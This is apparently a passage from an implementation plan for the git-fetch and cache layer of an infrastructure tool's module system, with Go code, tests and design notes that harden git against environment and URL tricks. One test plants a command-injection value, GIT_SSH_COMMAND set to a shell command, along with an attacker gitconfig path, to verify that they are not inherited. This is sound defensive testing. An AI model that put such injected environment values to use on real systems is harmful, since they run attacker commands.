	t.Setenv("GIT_SSH_COMMAND", "sh -c 'touch /tmp/pwned'")
	t.Setenv("GIT_CONFIG_GLOBAL", "/tmp/attacker.gitconfig")

	env := gitEnv("https://github.com/acme/repo")
	seen := map[string]string{}
	for _, kv := range env {
		k, v, _ := strings.Cut(kv, "=")
		if _, dup := seen[k]; dup {
			t.Errorf("%s appears twice in the environment; which one wins is then an accident of ordering", k)
		}
		seen[k] = v
	}

	for k, want := range map[string]string{
		"GIT_TERMINAL_PROMPT": "0",
		"GIT_ASKPASS":         "/bin/false",
		"SSH_ASKPASS":         "/bin/false",
		"GIT_ALLOW_PROTOCOL":  "https",
	} {
		if got := seen[k]; got != want {
			t.Errorf("%s = %q, want %q", k, got, want)
		}
	}
	for _, k := range []string{"GIT_SSH_COMMAND", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM"} {
		if v, ok := seen[k]; ok {
			t.Errorf("%s was inherited as %q; the environment is built from an allowlist so that an open-ended set of git variables cannot be inherited", k, v)
		}
	}
	if seen["HOME"] == "" || seen["PATH"] == "" {
		t.Error("HOME and PATH must be passed through: ssh keys and the git binary itself are found through them")
	}
}
```

#### 12.6 Run them, see them fail

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./internal/modules/source/
```

Expect `undefined: gitRunner`, `undefined: gitEnv`, `undefined: transportOf`. That is the
honest failure.

#### 12.7 Minimal code

Create `internal/modules/source/git.go`:

```go
package source

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

const defaultGitTimeout = 2 * time.Minute

// fetchRef is where a fetched ref is parked inside the cache checkout. It is a
// fixed name under refs/infra/ so that nothing a remote can name collides with
// it.
const fetchRef = "refs/infra/target"

// gitRunner runs the git binary. It is the only code in this repository that
// executes another program.
type gitRunner struct {
	Timeout time.Duration
}

func (g gitRunner) timeout() time.Duration {
	if g.Timeout > 0 {
		return g.Timeout
	}
	return defaultGitTimeout
}

// run invokes git in dir (empty for a repository-less command). location is the
// remote this invocation talks to, and it decides the transport policy — not the
// arguments, which may not even contain it.
//
// Every invocation gets:
//
//   - a fresh environment built from an allowlist (see gitEnv), so an inherited
//     GIT_ASKPASS, GIT_SSH_COMMAND or GIT_ALLOW_PROTOCOL cannot change what runs;
//   - exactly one permitted transport, named in GIT_ALLOW_PROTOCOL by gitEnv,
//     because git applies url.<base>.insteadOf BEFORE choosing a transport and a
//     rewrite can therefore turn an allowlisted https:// URL into something else;
//   - an empty init.templateDir and a hooks path that does not exist, so a
//     template directory cannot install a hook that runs during checkout;
//   - a "--" before the first positional argument, because git parses an
//     argument beginning with "-" as an option and a URL is an argument.
func (g gitRunner) run(ctx context.Context, dir, location string, args ...string) (string, error) {
	ctx, cancel := context.WithTimeout(ctx, g.timeout())
	defer cancel()

	// No -c protocol.* here: GIT_ALLOW_PROTOCOL in gitEnv is the transport
	// policy and overrides these in both directions (measured), so a second
	// spelling could only ever agree with it or contradict it.
	full := []string{
		"-c", "init.templateDir=",
		"-c", "init.defaultBranch=infra",
		"-c", "advice.detachedHead=false",
		"-c", "core.hooksPath=" + filepath.Join(dir, ".infra-no-hooks"),
	}
	full = append(full, args...)

	cmd := exec.CommandContext(ctx, "git", full...)
	cmd.Dir = dir
	cmd.Env = gitEnv(location)
	cmd.Stdin = nil

	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		detail := strings.TrimSpace(stderr.String())
		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
			return "", fmt.Errorf("git %s timed out after %s: %s", args[0], g.timeout(), detail)
		}
		if detail == "" {
			detail = err.Error()
		}
		return "", fmt.Errorf("git %s: %s", args[0], detail)
	}
	return stdout.String(), nil
}

// gitEnv builds the environment for a git invocation from an allowlist.
//
// A denylist was the alternative and it is the wrong shape: the variables that
// must not be inherited (GIT_ASKPASS, GIT_SSH_COMMAND, GIT_ALLOW_PROTOCOL,
// GIT_CONFIG_*, GIT_PROTOCOL_FROM_USER, ...) are an open-ended set, and a
// denylist over an open-ended set is a list that gets updated after an incident.
//
// The passthrough list is what git needs to reach a real remote on a real
// machine: HOME (ssh keys, and the user's own gitconfig, whose insteadOf rules
// the protocol policy above neutralises), PATH, the ssh agent socket, proxy
// settings, and TLS trust stores. GIT_CONFIG_GLOBAL and GIT_CONFIG_SYSTEM are
// deliberately NOT passed through, and neither is the system config disabled: a
// corporate /etc/gitconfig carries proxy settings that the fetch needs.
//
// credential.helper is likewise left alone. A helper is non-interactive by
// design and is how a private module repository authenticates without a prompt;
// clearing it would break exactly the case GIT_ASKPASS exists to keep from
// hanging.
func gitEnv(location string) []string {
	env := map[string]string{}
	for _, k := range []string{
		"HOME", "PATH", "SSH_AUTH_SOCK", "TMPDIR", "USER", "LOGNAME",
		"http_proxy", "https_proxy", "no_proxy",
		"HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY",
		"SSL_CERT_FILE", "SSL_CERT_DIR", "GIT_SSL_CAINFO", "GIT_SSL_CAPATH",
	} {
		if v, ok := os.LookupEnv(k); ok {
			env[k] = v
		}
	}

	// Set last, and into a map, so nothing above can be inherited into them.
	env["GIT_TERMINAL_PROMPT"] = "0"
	env["GIT_ASKPASS"] = "/bin/false"
	env["SSH_ASKPASS"] = "/bin/false"
	env["SSH_ASKPASS_REQUIRE"] = "never"
	// The transport policy, and the only one (Amendment 17). Measured:
	// GIT_ALLOW_PROTOCOL overrides -c protocol.*.allow in BOTH directions,
	// so a -c policy is not a policy while this can be set; and setting it
	// here overwrites whatever the user's environment held. It is enforced
	// after url.<base>.insteadOf rewriting, which is what makes it — not
	// Parse's allowlist — the thing that stops a rewritten URL.
	env["GIT_ALLOW_PROTOCOL"] = transportOf(location)

	out := make([]string, 0, len(env))
	for k, v := range env {
		out = append(out, k+"="+v)
	}
	sort.Strings(out) // deterministic, and it makes a duplicate key impossible to hide
	return out
}

// transportOf names the one transport a location claims. The policy is derived
// per invocation rather than fixed at a set of allowed schemes, so the permitted
// set is never wider than the single source being fetched.
func transportOf(location string) string {
	if scheme, _, ok := splitScheme(location); ok {
		return scheme
	}
	if _, _, ok := splitSCP(location); ok {
		return "ssh"
	}
	return "file"
}

// lsRemoteCommit resolves ref to the commit it names without transferring any
// objects. It is how a tag pin is checked for movement on a run that would
// otherwise not touch the network.
//
// BOTH peeling routes are used, deliberately, one per path: this function asks
// the remote to peel ("^{}"), and checkout asks the local object store
// ("^{commit}") after fetching. They are not alternatives — the ls-remote path
// has no objects to read and the fetch path has no reason to make a second
// round trip — and they must produce the same kind of hash, because the
// moved-tag comparison in modules.lock puts one against the other. Comparing a
// tag object against a commit would report every annotated tag as moved, on
// every run, forever.
//
// Two behaviours of ls-remote drive the shape here, both measured:
//
//   - an annotated tag's own line carries the TAG OBJECT's hash, and the commit
//     appears only on the peeled "^{}" line, which is printed only if asked for;
//   - a ref that does not exist is exit status 0 with no output.
func (g gitRunner) lsRemoteCommit(ctx context.Context, location, ref string) (string, error) {
	out, err := g.run(ctx, "", location, "ls-remote", "--", location,
		"refs/tags/"+ref+"^{}", "refs/tags/"+ref, "refs/heads/"+ref)
	if err != nil {
		return "", err
	}

	var peeled, plain string
	for _, line := range strings.Split(out, "\n") {
		hash, name, ok := strings.Cut(strings.TrimSpace(line), "\t")
		if !ok {
			continue
		}
		if strings.HasSuffix(name, "^{}") {
			peeled = hash
			continue
		}
		if plain == "" {
			plain = hash
		}
	}
	if peeled != "" {
		return peeled, nil
	}
	if plain == "" {
		return "", fmt.Errorf("the remote has no tag or branch named %q", ref)
	}
	return plain, nil
}

// fetchCommit creates a checkout of s at dir and returns the commit it is at.
//
// Two routes, because an abbreviated hash cannot be fetched as a ref at all
// (measured: "couldn't find remote ref 34d6815"), while a tag or a full hash can
// be fetched at depth 1:
//
//   - depth 1 for a tag or a 40-character hash;
//   - a full fetch followed by a local rev-parse for an abbreviated hash, and as
//     the fallback when the depth-1 route fails for a full hash, since a server
//     need not serve an arbitrary object by name.
func (g gitRunner) fetchCommit(ctx context.Context, dir string, s Source) (string, error) {
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", err
	}
	if _, err := g.run(ctx, dir, s.Location, "init", "-q"); err != nil {
		return "", err
	}

	if !s.PinnedToHash() || len(s.Ref) == 40 {
		// The refspec begins with "+", so the ref can never be read as an
		// option however it was written; Parse refuses a leading "-" as well.
		commit, err := g.fetchShallow(ctx, dir, s)
		if err == nil {
			return commit, nil
		}
		if !s.PinnedToHash() {
			return "", err
		}
	}
	return g.fetchFull(ctx, dir, s)
}

func (g gitRunner) fetchShallow(ctx context.Context, dir string, s Source) (string, error) {
	if _, err := g.run(ctx, dir, s.Location, "fetch", "-q", "--depth=1", "--",
		s.Location, "+"+s.Ref+":"+fetchRef); err != nil {
		return "", err
	}
	return g.checkout(ctx, dir, s.Location, fetchRef)
}

func (g gitRunner) fetchFull(ctx context.Context, dir string, s Source) (string, error) {
	if _, err := g.run(ctx, dir, s.Location, "fetch", "-q", "--tags", "--",
		s.Location, "+refs/heads/*:refs/remotes/origin/*"); err != nil {
		return "", err
	}
	return g.checkout(ctx, dir, s.Location, s.Ref)
}

// checkout resolves rev to a commit and checks it out detached. The "^{commit}"
// suffix is load-bearing: rev may name an annotated tag, whose own hash is not
// the commit's, and the hash recorded in modules.lock must be the commit or
// every later run compares two different kinds of object.
func (g gitRunner) checkout(ctx context.Context, dir, location, rev string) (string, error) {
	out, err := g.run(ctx, dir, location, "rev-parse", "--verify", "--end-of-options", rev+"^{commit}")
	if err != nil {
		return "", fmt.Errorf("resolving %q: %w", rev, err)
	}
	commit := trimLine(out)
	if _, err := g.run(ctx, dir, location, "checkout", "-q", "--detach", commit); err != nil {
		return "", err
	}
	return commit, nil
}

func trimLine(s string) string {
	s = strings.TrimSpace(s)
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		s = s[:i]
	}
	return strings.TrimSpace(s)
}
```

`--end-of-options` on `rev-parse` is the same guard as `--` elsewhere: it stops a
revision beginning with `-` being read as an option. `Parse` already refuses one, and this
is the second place that has to be wrong before it matters.

#### 12.8 Run them, see them pass

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./internal/modules/source/
go test -count=1 -race ./internal/modules/source/
go vet ./internal/modules/source/ && gofmt -l internal/modules/source/
```

#### 12.9 Sabotage, and what each proves

Run each, confirm exactly the named test fails, revert.

| Sabotage | Must fail |
|----------|-----------|
| Delete `env["GIT_ALLOW_PROTOCOL"]` from `gitEnv` | `TestGitRefusesATransportTheLocationDoesNotName` AND `TestGitEnvDisablesPromptingAndPinsTheTransport`. Two failures from one deleted line, one of which is an actual bypass: confirm you see both |
| Add `-c protocol.allow=never` back "for safety" | nothing fails, which is the argument against it: a knob that cannot be observed to be doing anything is a knob nobody will notice has stopped working |
| Delete `env["GIT_ASKPASS"]` | `TestFetchDoesNotHangWhenTheRemoteAsksForAPassword` (by timing out) |
| Delete `env["GIT_TERMINAL_PROMPT"]` | **only** `TestGitEnvDisablesPromptingAndPinsTheTransport`. Measured line 9 is why: with no controlling terminal git fails fast anyway, so no end-to-end test can see this one. Do not "fix" that by deleting the unit test — it is the only failure this line has |
| Replace `rev+"^{commit}"` with `rev` | `TestFetchCommitPeelsAnAnnotatedTagToItsCommit` |
| Treat `ls-remote`'s exit status as the answer (drop the empty-output check) | `TestLsRemoteCommitReportsAMissingRefRatherThanSucceeding` |

#### 12.10 Commit

```bash
git add internal/modules/source/git.go internal/modules/source/git_test.go internal/modules/source/testrepo_test.go
git commit -m "Add the git invocation layer for module sources

Every invocation gets an environment built from an allowlist, a transport policy
naming exactly the one transport the location claims (GIT_ALLOW_PROTOCOL, which
overrides -c protocol.* in both directions and is therefore the only spelling
used), GIT_TERMINAL_PROMPT=0 and GIT_ASKPASS=/bin/false, an empty
init.templateDir, and \"--\" before every positional argument.

Measured against git 2.43 while writing this: url.<base>.insteadOf rewrites a URL
BEFORE the transport is chosen, so the scheme allowlist in Parse can be walked
around by the user's own gitconfig and the per-invocation protocol policy is what
refuses it; an annotated tag's ls-remote line carries the tag object's hash, not
the commit's; ls-remote exits 0 with no output for a ref that does not exist; and
an abbreviated hash cannot be fetched as a ref, so it takes the full-fetch route.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>" -- internal/modules/source/git.go internal/modules/source/git_test.go internal/modules/source/testrepo_test.go
```

---

---

## Task 13 — the cache: its lock, its publication, and when the network may be skipped

### Why this task exists

Two `infra plan` runs on one project, or one run instantiating the same module twice, will
land on the same cache directory at the same time. The cache is also the only place that
can decide when a fetch may be skipped, and that decision is what makes Amendment 10b's
moved-tag detection possible or impossible.

### Link or Rename: the question Amendment 10 asks, answered

`internal/state/lock.go` writes a temp file and then `os.Link`s it into place, and its
comment says why: `os.Rename` **overwrites** its target, so a second `Lock` would silently
replace the first holder's lock file and both processes would believe they held it.
`os.Link` fails with `EEXIST`, which is create-or-fail, which is exclusivity.
`internal/state/local.go`'s `Put` uses `Rename` in the same package for the opposite
requirement: saving state is *supposed* to overwrite.

The module cache needs **both, in different places**, and getting either backwards has a
different consequence:

- **The lock file is `Link`.** If it were `Rename`, two fetchers would both hold "the"
  lock, both would `RemoveAll` the target directory, and the second's removal would delete
  the tree the first had just published — while a third process, or stage 5 itself, was
  reading it. That is not a wasted fetch; it is a **torn module tree handed to the
  compiler**, which then reports a module with half its resources missing. Exclusivity is
  the whole requirement, so `Link` is the whole answer.
- **The checkout is published by `Rename` of a directory.** If publication were attempted
  the way the lock is, it could not work at all — `os.Link` does not link directories —
  and the nearest equivalent, fetching directly into the final path and writing a marker
  file last, leaves a **partially fetched tree visible under its final name** for the
  length of the fetch. Any concurrent reader that does not take the lock (and stage 5
  takes no lock; it calls `Resolve`) sees it. Atomic replacement of a name is the
  requirement, so `Rename` is the answer.

So: the lock makes the fetch happen once, and the rename makes what is published always
whole. **If the lock were wrong we would waste a fetch and race on removal; if the rename
were wrong we would publish a half-tree.** The rename is the correctness guarantee and the
lock is what keeps the work from being done twice — which is why the rename is not dropped
on the grounds that the lock already serialises everything.

One consequence of `Rename` worth writing down in the code: renaming onto an existing
non-empty directory fails with `ENOTEMPTY` on Linux. The target is therefore removed under
the lock immediately before the rename, and a rename that still fails is treated as
"someone published first" rather than as an error.

### The layout

```text
<project>/.infra/modules/<sha256(location)[:16]>/<refslug>/          the checkout
<project>/.infra/modules/<sha256(location)[:16]>/<refslug>.lock      the lock file
<project>/.infra/modules/<sha256(location)[:16]>/<refslug>/.infra-module   the marker
<project>/.infra/modules/.tmp-<random>/                              a fetch in progress
```

The marker is written **last**, inside the temp directory, before the rename — so a
directory that exists without a valid marker is by construction a directory that was never
published by this code, and is discarded.

**Which of the two paths this milestone creates goes where, stated because the wrong call
is silent in both directions** (Author C raised this):

| Path | Committed? | Why |
|------|-----------|-----|
| `.infra/modules/…` | **No** — derived data | It is a cache. Committing it bloats the repository with a git checkout inside a git repository, and it can always be rebuilt from `modules.lock` |
| `modules.lock` | **Yes** | It is the record of what each tag resolved to. Ignore it and the determinism it exists to provide is gone: every clone re-resolves every tag and nobody can see a move |

This repository's `.gitignore` happens to carry `.infra/` today, but **do not write code
that reads `.gitignore` or assumes one exists**. When `infra init` is built (it is not in
M5) it must write both rules. Until then this table is the record of the intent.

`refslug` is the ref when it is already a safe single path segment (`v1.2.0`,
`9f3c1ab`) and `ref-<sha256(ref)[:16]>` otherwise, because a ref may contain `/`
(`release/1.0`) and a nested directory would put the lock file and the checkout at
different depths. `validRef` already refuses `..`, so this is about shape, not traversal.

### When the network may be skipped

| Pin | Cached and valid | Rule |
|-----|------------------|------|
| commit hash | yes | **Skip the network entirely.** A commit names an immutable object; re-fetching it can only return the same tree |
| commit hash | no | Fetch |
| tag | yes | **`ls-remote` always** — no objects transferred — and reuse the checkout only if the remote still points at the recorded commit. Otherwise re-fetch |
| tag | no | Fetch |

The middle row is the one that cannot be optimised away. A tag is mutable, so "cached"
does not imply "unchanged", and the whole of Amendment 10b is the ability to notice that
it changed. Skipping `ls-remote` for a cached tag would give a cache that appears
deterministic — every run producing the same plan — precisely by being unable to see the
thing that makes it not deterministic.

For a hash pin, the marker's recorded commit must have the pinned ref as a prefix
(`strings.HasPrefix(marker.Commit, s.Ref)`); if it does not, the entry belongs to a
different commit and is discarded rather than trusted.

### Files

| Action | Path |
|--------|------|
| create | `internal/modules/source/cache.go` |
| create | `internal/modules/source/cache_test.go` |
| create | `internal/modules/source/prepopulate.go` (13.6a — the exported test helper) |

### Interfaces

**Produces:**

```go
// Resolution is what a source resolved to. Commit is empty for KindPath.
type Resolution struct {
    Dir    string
    Commit string
}

type Cache struct {
    // ProjectDir is the project root: the cache lives at
    // <ProjectDir>/.infra/modules and modules.lock beside infra.yml.
    ProjectDir string
    // LockTimeout bounds how long Resolve waits for another process to
    // finish fetching the same source. Zero means defaultLockTimeout.
    LockTimeout time.Duration
    // Git is the runner; the zero value is the real one.
    Git gitRunner
}

func NewCache(projectDir string) *Cache
func (c *Cache) Resolve(s Source, baseDir string) (Resolution, diag.Diagnostics)
```

**That signature is Author B's `Resolver` interface exactly** (Amendment 17a), and `Expand`
takes one injected rather than building a `Cache` itself, because a nested module's
`modules:` list lives inside its own `module.yml` and is unknowable until stage 5 has
loaded it — so resolution happens mid-walk. `*Cache` satisfies it with no adapter. The
compile-time assertion belongs in `internal/modules` (`var _ Resolver = (*source.Cache)(nil)`)
and is B's to write; **do not add a reverse import to assert it from here**, which would
be the cycle Amendment 15b depends on not existing.

### Steps

#### 13.1 Failing test: a path source

Create `internal/modules/source/cache_test.go`:

```go
package source

import (
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/infrata/infrata/pkg/value"
)

func TestResolveAPathSourceAgainstTheFileThatDeclaredIt(t *testing.T) {
	project := t.TempDir()
	nested := filepath.Join(project, "modules", "app")
	if err := os.MkdirAll(filepath.Join(nested, "sub"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	c := NewCache(project)

	// A source declared in modules/app/module.yml resolves against
	// modules/app, not against the project root — which is what baseDir is
	// for, and what makes "../shared" mean the same thing to a reader of that
	// file as it does to the loader.
	got, ds := c.Resolve(Source{Kind: KindPath, Location: "./sub"}, nested)
	if ds.HasErrors() {
		t.Fatalf("Resolve: %+v", ds)
	}
	if want := filepath.Join(nested, "sub"); got.Dir != want {
		t.Errorf("Dir = %q, want %q", got.Dir, want)
	}
	if got.Commit != "" {
		t.Errorf("Commit = %q, want empty: a directory has no commit, and recording one in modules.lock would record something nothing can check", got.Commit)
	}

	abs, ds := c.Resolve(Source{Kind: KindPath, Location: nested}, project)
	if ds.HasErrors() {
		t.Fatalf("Resolve(absolute): %+v", ds)
	}
	if abs.Dir != nested {
		t.Errorf("absolute Dir = %q, want %q", abs.Dir, nested)
	}
}

func TestResolveReportsAMissingPathSource(t *testing.T) {
	project := t.TempDir()
	origin := value.Origin{File: "infra.yml", Line: 3, Column: 5}

	_, ds := c13(t, project).Resolve(Source{Kind: KindPath, Location: "./modules/nope", Origin: origin}, project)
	if !ds.HasErrors() {
		t.Fatal("Resolve succeeded for a directory that does not exist")
	}
	var sb strings.Builder
	ds.Render(&sb)
	for _, want := range []string{"./modules/nope", "infra.yml:3:5", "Suggested action:"} {
		if !strings.Contains(sb.String(), want) {
			t.Errorf("diagnostic does not mention %q:\n%s", want, sb.String())
		}
	}
}

// TestResolveReportsAPathSourceThatIsAFile is a separate case because the
// failure a user hits is different: `source: ./modules/app/module.yml` is the
// natural mistake, and "not a directory" is the answer, not "does not exist".
func TestResolveReportsAPathSourceThatIsAFile(t *testing.T) {
	project := t.TempDir()
	if err := os.WriteFile(filepath.Join(project, "module.yml"), []byte("inputs: {}\n"), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	_, ds := c13(t, project).Resolve(Source{Kind: KindPath, Location: "./module.yml"}, project)
	if !ds.HasErrors() {
		t.Fatal("Resolve succeeded for a source naming a file")
	}
	var sb strings.Builder
	ds.Render(&sb)
	if !strings.Contains(sb.String(), "is a file") {
		t.Errorf("diagnostic does not say the source is a file:\n%s", sb.String())
	}
}

func c13(t *testing.T, project string) *Cache {
	t.Helper()
	c := NewCache(project)
	c.LockTimeout = 5 * time.Second
	c.Git = gitRunner{Timeout: 30 * time.Second}
	return c
}
```

#### 13.2 Failing test: a git source is fetched into the cache

```go
func TestResolveFetchesAGitSourceIntoTheCache(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)
	project := t.TempDir()

	got, ds := c13(t, project).Resolve(gitSource(repo.Path, "v1.0.0"), project)
	if ds.HasErrors() {
		t.Fatalf("Resolve: %+v", ds)
	}
	if got.Commit != repo.Commit {
		t.Errorf("Commit = %q, want %q", got.Commit, repo.Commit)
	}
	if !strings.HasPrefix(got.Dir, filepath.Join(project, ".infra", "modules")) {
		t.Errorf("Dir = %q, want it under the project's .infra/modules", got.Dir)
	}
	if _, err := os.Stat(filepath.Join(got.Dir, "module.yml")); err != nil {
		t.Errorf("the checkout has no module.yml: %v", err)
	}
	if _, err := os.Stat(filepath.Join(got.Dir, markerName)); err != nil {
		t.Errorf("the checkout has no marker: %v — without one, an interrupted fetch is indistinguishable from a finished one", err)
	}
}

// TestResolveDoesNotFetchAHashPinThatIsAlreadyCached proves the skip by making
// the network impossible: after the first Resolve, the remote repository is
// DELETED. A second Resolve that reaches the network cannot succeed, so this
// fails the moment the skip rule is removed — and it cannot be satisfied by any
// amount of caching that still talks to the remote.
func TestResolveDoesNotFetchAHashPinThatIsAlreadyCached(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	project := t.TempDir()
	c := c13(t, project)

	first, ds := c.Resolve(gitSource(repo.Path, repo.Commit), project)
	if ds.HasErrors() {
		t.Fatalf("first Resolve: %+v", ds)
	}
	if err := os.RemoveAll(repo.Path); err != nil {
		t.Fatalf("removing the remote: %v", err)
	}

	second, ds := c.Resolve(gitSource(repo.Path, repo.Commit), project)
	if ds.HasErrors() {
		t.Fatalf("second Resolve with the remote deleted: %+v — a commit pin that is already cached must not touch the network", ds)
	}
	if second.Dir != first.Dir || second.Commit != first.Commit {
		t.Errorf("second Resolve = %+v, want %+v", second, first)
	}
}

// TestResolveChecksATagPinAgainstTheRemoteEveryTime is the same test with the
// opposite expectation, and it is the one that keeps Amendment 10b possible. A
// tag is mutable, so a cached tag that is never re-checked is a plan that
// silently differs from yesterday's. Delete the ls-remote call for a cached tag
// and this passes — which is why the assertion is that it FAILS.
func TestResolveChecksATagPinAgainstTheRemoteEveryTime(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)
	project := t.TempDir()
	c := c13(t, project)

	if _, ds := c.Resolve(gitSource(repo.Path, "v1.0.0"), project); ds.HasErrors() {
		t.Fatalf("first Resolve: %+v", ds)
	}
	if err := os.RemoveAll(repo.Path); err != nil {
		t.Fatalf("removing the remote: %v", err)
	}
	if _, ds := c.Resolve(gitSource(repo.Path, "v1.0.0"), project); !ds.HasErrors() {
		t.Error("a cached TAG resolved with the remote gone; a tag must be re-checked on every run or a moved tag can never be detected")
	}
}

// TestResolveFollowsATagThatMoved covers the other half: when the remote's tag
// now points somewhere else, the cache must produce the new tree, not the old
// one. (Whether that CHANGE is reported to the user is Task 14's, at the
// modules.lock layer; here it is only that the checkout follows.)
func TestResolveFollowsATagThatMoved(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)
	project := t.TempDir()
	c := c13(t, project)

	first, ds := c.Resolve(gitSource(repo.Path, "v1.0.0"), project)
	if ds.HasErrors() {
		t.Fatalf("first Resolve: %+v", ds)
	}

	repo.CommitFiles(t, map[string]string{"module.yml": "inputs: {}\noutputs: {}\n"}, "second")
	repo.Tag(t, "v1.0.0", false)

	second, ds := c.Resolve(gitSource(repo.Path, "v1.0.0"), project)
	if ds.HasErrors() {
		t.Fatalf("second Resolve: %+v", ds)
	}
	if second.Commit == first.Commit {
		t.Fatalf("Commit is still %q after the tag moved", second.Commit)
	}
	body, err := os.ReadFile(filepath.Join(second.Dir, "module.yml"))
	if err != nil {
		t.Fatalf("reading the checkout: %v", err)
	}
	if !strings.Contains(string(body), "outputs:") {
		t.Errorf("the checkout is still the old tree: %q — a moved tag must re-publish, not just report", body)
	}
}
```

#### 13.3 Failing test: an interrupted fetch, and a corrupt entry

```go
// TestResolveReplacesAnInterruptedCheckout builds the state an interrupted
// fetch leaves behind — a directory with some of the files and no marker — and
// requires Resolve to discard it. Delete the marker check and this fails by
// returning the junk directory, which stage 5 would then load as a module.
func TestResolveReplacesAnInterruptedCheckout(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)
	project := t.TempDir()
	c := c13(t, project)

	junk := c.checkoutDir(gitSource(repo.Path, "v1.0.0"))
	if err := os.MkdirAll(junk, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(junk, "half.txt"), []byte("truncated"), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}

	got, ds := c.Resolve(gitSource(repo.Path, "v1.0.0"), project)
	if ds.HasErrors() {
		t.Fatalf("Resolve: %+v", ds)
	}
	if _, err := os.Stat(filepath.Join(got.Dir, "half.txt")); err == nil {
		t.Error("the interrupted checkout survived; a directory with no valid marker was never published by this code and must be discarded")
	}
	if _, err := os.Stat(filepath.Join(got.Dir, "module.yml")); err != nil {
		t.Errorf("the replacement checkout is missing module.yml: %v", err)
	}
}

// TestResolveReplacesACheckoutWhoseMarkerNamesAnotherCommit covers the hash-pin
// prefix check. A marker recording a different commit than the pin means the
// directory holds a different tree; trusting it would serve the wrong module
// from a pin that is supposed to be exact.
func TestResolveReplacesACheckoutWhoseMarkerNamesAnotherCommit(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	project := t.TempDir()
	c := c13(t, project)

	got, ds := c.Resolve(gitSource(repo.Path, repo.Commit), project)
	if ds.HasErrors() {
		t.Fatalf("Resolve: %+v", ds)
	}
	bad := `{"version":1,"location":"` + repo.Path + `","ref":"` + repo.Commit + `","commit":"0000000000000000000000000000000000000000"}`
	if err := os.WriteFile(filepath.Join(got.Dir, markerName), []byte(bad), 0o600); err != nil {
		t.Fatalf("write marker: %v", err)
	}

	again, ds := c.Resolve(gitSource(repo.Path, repo.Commit), project)
	if ds.HasErrors() {
		t.Fatalf("Resolve after corrupting the marker: %+v", ds)
	}
	if again.Commit != repo.Commit {
		t.Errorf("Commit = %q, want %q: a marker disagreeing with the pin must be discarded, not believed", again.Commit, repo.Commit)
	}
}
```

#### 13.4 Failing test: the lock

```go
// TestResolveWaitsForAnotherProcessAndGivesUpWithADiagnostic pins the lock
// itself. The lock file is created the way internal/state/lock.go creates one —
// os.Link, which fails if the target exists — so a lock that is already held is
// observable from here by creating the file.
//
// Delete the lock acquisition and this fails: Resolve returns a resolution
// instead of a diagnostic.
func TestResolveWaitsForAnotherProcessAndGivesUpWithADiagnostic(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)
	project := t.TempDir()
	c := c13(t, project)
	c.LockTimeout = 300 * time.Millisecond

	s := gitSource(repo.Path, "v1.0.0")
	lock := c.lockPath(s)
	if err := os.MkdirAll(filepath.Dir(lock), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(lock, []byte(`{"pid":1,"host":"elsewhere"}`), 0o600); err != nil {
		t.Fatalf("write lock: %v", err)
	}

	start := time.Now()
	_, ds := c.Resolve(s, project)
	if !ds.HasErrors() {
		t.Fatal("Resolve proceeded while another process held the fetch lock")
	}
	if elapsed := time.Since(start); elapsed < c.LockTimeout {
		t.Errorf("Resolve gave up after %s, before the %s timeout: it must wait, because the holder is normally about to finish", elapsed, c.LockTimeout)
	}
	var sb strings.Builder
	ds.Render(&sb)
	if !strings.Contains(sb.String(), lock) {
		t.Errorf("the diagnostic does not name the lock file, which is the only thing the user can act on:\n%s", sb.String())
	}
}

// TestResolveIsSafeWhenCallersRace runs eight concurrent Resolves of one source.
// What it catches is a torn publication: every caller must see a complete
// checkout, never a directory mid-fetch. It does NOT prove the fetch happened
// once — duplicate work is a cost, not a correctness failure, and no assertion
// here could tell the difference without counting invocations of git.
//
// Run with -race; the whole suite is run that way in 14.9 too.
func TestResolveIsSafeWhenCallersRace(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)
	project := t.TempDir()
	c := c13(t, project)
	c.LockTimeout = 60 * time.Second

	var wg sync.WaitGroup
	results := make([]Resolution, 8)
	errs := make([]diag.Diagnostics, 8)
	for i := range results {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			results[i], errs[i] = c.Resolve(gitSource(repo.Path, "v1.0.0"), project)
		}(i)
	}
	wg.Wait()

	for i := range results {
		if errs[i].HasErrors() {
			t.Fatalf("caller %d: %+v", i, errs[i])
		}
		if results[i] != results[0] {
			t.Errorf("caller %d resolved to %+v, caller 0 to %+v", i, results[i], results[0])
		}
		if _, err := os.Stat(filepath.Join(results[i].Dir, "module.yml")); err != nil {
			t.Errorf("caller %d saw an incomplete checkout: %v", i, err)
		}
	}
}
```

`cache_test.go` needs `"github.com/infrata/infrata/internal/diag"` for that last test.

